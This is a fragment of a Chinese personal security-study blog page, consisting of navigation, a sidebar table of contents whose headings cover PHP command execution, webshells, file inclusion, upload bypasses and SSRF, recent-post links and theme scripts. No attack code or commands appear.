href="/Web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="伪协议"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-18</div><div class="title">伪协议</div></div></a></div><div><a href="/Crypto/RC4/Crypto-RC4/" title="Crypto-RC4"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-05-18</div><div class="title">Crypto-RC4</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://jinmu-1313986858.cos.ap-beijing.myqcloud.com/liujin.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Jinmu</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">55</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jinmu1108"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">学习WEB</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">信息泄露漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#http%E5%A4%B4%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.</span> <span class="toc-text">http头信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#admin-%E5%92%8C-admin%E5%8C%BA%E5%88%AB"><span class="toc-number">2.1.1.</span> <span class="toc-text">&#x2F;admin&#x2F;和&#x2F;admin区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.2.</span> <span class="toc-text">报错信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.3.</span> <span class="toc-text">页面信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#robots-txt%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.4.</span> <span class="toc-text">robots.txt敏感信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#git%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">2.5.</span> <span class="toc-text">git文件泄露</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">php基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">3.1.</span> <span class="toc-text">php的基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">php基础语法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GET"><span class="toc-number">3.3.</span> <span class="toc-text">_GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POST"><span class="toc-number">3.4.</span> <span class="toc-text">_POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">3.5.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">3.6.</span> <span class="toc-text">危险函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">php命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE"><span class="toc-number">4.1.</span> <span class="toc-text">命令执行RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%9A%84cmmand-exec%E5%87%BD%E6%95%B0"><span class="toc-number">4.2.</span> <span class="toc-text">php的cmmand exec函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E8%BF%90%E7%94%A8"><span class="toc-number">4.3.</span> <span class="toc-text">php的命令执行和运用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="toc-number">4.4.</span> <span class="toc-text">黑名单过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">4.4.1.</span> <span class="toc-text">双写绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#QQ%E5%9B%BE%E7%89%8720220928233229"><span class="toc-number">4.4.1.1.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%AE%9A%E5%AD%97%E7%AC%A6%E8%BF%87%E6%BB%A4flag%E7%9A%84%E6%83%85%E5%86%B5"><span class="toc-number">4.4.2.</span> <span class="toc-text">特定字符过滤flag的情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">4.4.3.</span> <span class="toc-text">*通配符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%A0%E4%BD%8D%E7%AC%A6"><span class="toc-number">4.4.4.</span> <span class="toc-text">?占位符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4cat-more%E7%AD%89%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%91%BD%E4%BB%A4%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%9B%E7%9B%B4%E6%8E%A5"><span class="toc-number">4.4.5.</span> <span class="toc-text">过滤cat,more等文件读取命令的情况；直接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97QQ%E5%9B%BE%E7%89%8720220929002843"><span class="toc-number">4.4.6.</span> <span class="toc-text">变量拼接绕过关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4%E5%8F%AF%E4%BB%A5%E7%88%86%E7%A0%B4%E4%B8%80%E4%B8%8B"><span class="toc-number">4.4.7.</span> <span class="toc-text">符号过滤可以爆破一下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97"><span class="toc-number">4.4.8.</span> <span class="toc-text">过滤字母数字</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cmd-env"><span class="toc-number">4.5.</span> <span class="toc-text">cmd&#x3D;env</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">3php的代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFphp%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">5.1.</span> <span class="toc-text">什么是php的代码执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">5.2.</span> <span class="toc-text">代码执行和命令执行的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%BC%E5%BC%8F"><span class="toc-number">5.3.</span> <span class="toc-text">php的代码执行是什么格式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8php%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%88%86%E4%B8%BA%E4%B8%89%E7%A7%8D"><span class="toc-number">5.3.1.</span> <span class="toc-text">在php语言中分为三种</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">5.3.1.1.</span> <span class="toc-text">函数调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%B1%BB%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8"><span class="toc-number">5.3.1.2.</span> <span class="toc-text">类方法调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E8%A8%80%E7%BB%93%E6%9E%84%E8%B0%83%E7%94%A8"><span class="toc-number">5.3.1.3.</span> <span class="toc-text">语言结构调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%90%8E%E9%97%A8"><span class="toc-number">5.4.</span> <span class="toc-text">php的代码执行后门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="toc-number">5.4.1.</span> <span class="toc-text">一句话木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GET-POST%E8%BD%AC%E6%8E%A5%E5%A4%B4"><span class="toc-number">5.4.2.</span> <span class="toc-text">_GET_POST转接头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%9B%9E%E6%98%BE"><span class="toc-number">5.4.3.</span> <span class="toc-text">不回显</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">php的文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="toc-number">6.1.</span> <span class="toc-text">文件包含的本质</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%80%A7"><span class="toc-number">6.2.</span> <span class="toc-text">可移植性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0"><span class="toc-number">6.3.</span> <span class="toc-text">文件包含的常见函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.4.</span> <span class="toc-text">伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%AD%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.4.1.</span> <span class="toc-text">计算机中的伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%B8%AD%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.4.2.</span> <span class="toc-text">php中的伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#file%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.4.2.1.</span> <span class="toc-text">file协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTP%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.4.2.2.</span> <span class="toc-text">HTTP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="toc-number">6.4.2.2.1.</span> <span class="toc-text">请求头</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Referer"><span class="toc-number">6.4.2.2.1.1.</span> <span class="toc-text">Referer</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#UA"><span class="toc-number">6.4.2.2.1.2.</span> <span class="toc-text">UA</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#XFF"><span class="toc-number">6.4.2.2.1.3.</span> <span class="toc-text">XFF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ftp%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.4.2.3.</span> <span class="toc-text">ftp协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.4.2.4.</span> <span class="toc-text">php协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-filter"><span class="toc-number">6.4.2.5.</span> <span class="toc-text">php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#data%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.4.2.6.</span> <span class="toc-text">data协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13%E7%BB%95%E8%BF%87"><span class="toc-number">6.4.2.7.</span> <span class="toc-text">rot13绕过</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">文件包含高级利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%8F%AF%E6%8E%A7%E7%82%B9"><span class="toc-number">7.1.</span> <span class="toc-text">文件包含可控点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8D%E5%8F%AF%E6%8E%A7"><span class="toc-number">7.2.</span> <span class="toc-text">文件名可控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E7%BC%80%E5%8F%AF%E6%8E%A7"><span class="toc-number">7.3.</span> <span class="toc-text">后缀可控</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%99%9A%E6%8B%9F%E7%9B%AE%E5%BD%95%E5%81%9A%E8%B7%B3%E8%BD%AC"><span class="toc-number">7.3.1.</span> <span class="toc-text">虚拟目录做跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nginx%E6%97%A5%E5%BF%97%E5%8C%85%E5%90%AB"><span class="toc-number">7.3.2.</span> <span class="toc-text">nginx日志包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">7.3.3.</span> <span class="toc-text">临时文件包含</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#session%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%EF%BC%88upload-progress%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%EF%BC%89"><span class="toc-number">7.3.4.</span> <span class="toc-text">session文件包含（upload_progress文件上传）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">用脚本的题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pear%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">8.0.1.</span> <span class="toc-text">pear文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%A7%BF%E5%8A%BF1"><span class="toc-number">8.0.1.1.</span> <span class="toc-text">姿势1</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">8.0.2.</span> <span class="toc-text">远程文件包含</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">6文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%9C%BA%E5%88%B6"><span class="toc-number">9.1.</span> <span class="toc-text">php文件上传机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%BE%8B%E5%AD%90"><span class="toc-number">9.2.</span> <span class="toc-text">文件上传的例子</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%A1%A8%E5%8D%95"><span class="toc-number">9.2.1.</span> <span class="toc-text">文件上传表单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E4%BE%8B%E5%AD%90-2"><span class="toc-number">9.2.2.</span> <span class="toc-text">文件上传的例子</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%88%90%E5%9B%A0"><span class="toc-number">9.2.3.</span> <span class="toc-text">文件上传的成因</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%AD%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8"><span class="toc-number">9.3.</span> <span class="toc-text">文件上传中可能存在</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E9%BB%91%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="toc-number">9.3.1.</span> <span class="toc-text">文件后缀黑名单过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%8400%E6%88%AA%E6%96%AD"><span class="toc-number">9.3.2.</span> <span class="toc-text">php文件上传的00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iconv%E5%AD%97%E7%AC%A6%E8%BD%AC%E6%8D%A2%E5%BC%82%E5%B8%B8%E9%80%A0%E6%88%90%E6%88%AA%E6%96%AD"><span class="toc-number">9.3.3.</span> <span class="toc-text">iconv字符转换异常造成截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%90%8E%E7%BC%80%E7%99%BD%E5%90%8D%E5%8D%95%E8%BF%87%E6%BB%A4"><span class="toc-number">9.3.4.</span> <span class="toc-text">文件后缀白名单过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E%E8%BF%87%E6%BB%A4"><span class="toc-number">9.3.4.1.</span> <span class="toc-text">1web服务器漏洞过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#IIS%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.3.4.2.</span> <span class="toc-text">IIS解析漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.3.4.3.</span> <span class="toc-text">Nginx解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="toc-number">9.3.5.</span> <span class="toc-text">Apache解析漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8"><span class="toc-number">9.4.</span> <span class="toc-text">文件上传的高级利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E8%BF%87%E6%BB%A4"><span class="toc-number">9.4.1.</span> <span class="toc-text">配置文件过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#user-ini%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B648t"><span class="toc-number">9.4.2.</span> <span class="toc-text">.user.ini配置文件48t</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%BF%E7%94%A8-use-ini%E8%87%AA%E5%8A%A8%E9%99%84%E5%8A%A0%E6%96%87%E4%BB%B6%E6%97%B6%EF%BC%8C%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E5%BF%85%E9%A1%BB%E8%A6%81%E6%9C%89php%E6%96%87%E4%BB%B6%EF%BC%9F"><span class="toc-number">9.4.3.</span> <span class="toc-text">为什么使用.use.ini自动附加文件时，当前目录必须要有php文件？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A6%81%E8%BF%BD%E5%8A%A0%E6%97%B6%E8%A6%81%E6%9C%89%E4%B8%80%E4%B8%AAphp%E6%96%87%E4%BB%B6%EF%BC%8C%E6%89%8D%E8%83%BD%E5%88%A9%E7%94%A8"><span class="toc-number">9.4.4.</span> <span class="toc-text">要追加时要有一个php文件，才能利用</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%94%BB%E5%87%BBfastcgi%E7%9A%849000%E7%AB%AF%E5%8F%A3"><span class="toc-number">9.4.4.0.1.</span> <span class="toc-text">攻击fastcgi的9000端口</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssrf%E7%9A%84%E7%BB%95%E8%BF%87"><span class="toc-number">9.5.</span> <span class="toc-text">ssrf的绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8enclosed-alphanumerics%E7%BB%95%E8%BF%87%E6%95%B0%E5%AD%97%E9%99%90%E5%88%B6"><span class="toc-number">9.5.1.</span> <span class="toc-text">使用enclosed alphanumerics绕过数字限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">9.5.2.</span> <span class="toc-text">IP地址进制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#302%E8%B7%B3%E8%BD%AC"><span class="toc-number">9.5.2.1.</span> <span class="toc-text">302跳转</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9F%AD%E7%BD%91%E5%9D%80%E7%BB%95%E8%BF%87"><span class="toc-number">9.5.2.2.</span> <span class="toc-text">短网址绕过</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/%E9%9D%B6%E5%9C%BA/%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/%E8%A7%A3%E9%A2%98/" title="分类练习"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="分类练习"/></a><div class="content"><a class="title" href="/%E9%9D%B6%E5%9C%BA/%E5%88%86%E7%B1%BB%E7%BB%83%E4%B9%A0/%E8%A7%A3%E9%A2%98/" title="分类练习">分类练习</a><time datetime="2024-05-18T02:45:18.126Z" title="发表于 2024-05-18 10:45:18">2024-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/uncategorized/CVE-2024-31828/" title="CVE-2024-31828"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2024-31828"/></a><div class="content"><a class="title" href="/uncategorized/CVE-2024-31828/" title="CVE-2024-31828">CVE-2024-31828</a><time datetime="2024-05-18T02:45:18.083Z" title="发表于 2024-05-18 10:45:18">2024-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/" title="离散数学"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="离散数学"/></a><div class="content"><a class="title" href="/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6/" title="离散数学">离散数学</a><time datetime="2024-05-18T02:44:07.537Z" title="发表于 2024-05-18 10:44:07">2024-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E8%93%9D%E9%98%9F/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%93%9D%E9%98%9F-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="蓝队"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝队"/></a><div class="content"><a class="title" href="/%E8%93%9D%E9%98%9F/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E8%93%9D%E9%98%9F-windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="蓝队">蓝队</a><time datetime="2024-05-18T02:44:07.537Z" title="发表于 2024-05-18 10:44:07">2024-05-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/%E8%93%9D%E9%98%9F/%E5%8F%8D%E5%88%B6CS/%E8%93%9D%E9%98%9F-%E5%8F%8D%E5%88%B6CS/" title="蓝队"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝队"/></a><div class="content"><a class="title" href="/%E8%93%9D%E9%98%9F/%E5%8F%8D%E5%88%B6CS/%E8%93%9D%E9%98%9F-%E5%8F%8D%E5%88%B6CS/" title="蓝队">蓝队</a><time datetime="2024-05-18T02:44:07.537Z" title="发表于 2024-05-18 10:44:07">2024-05-18</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Jinmu</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '',
      appKey: '',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
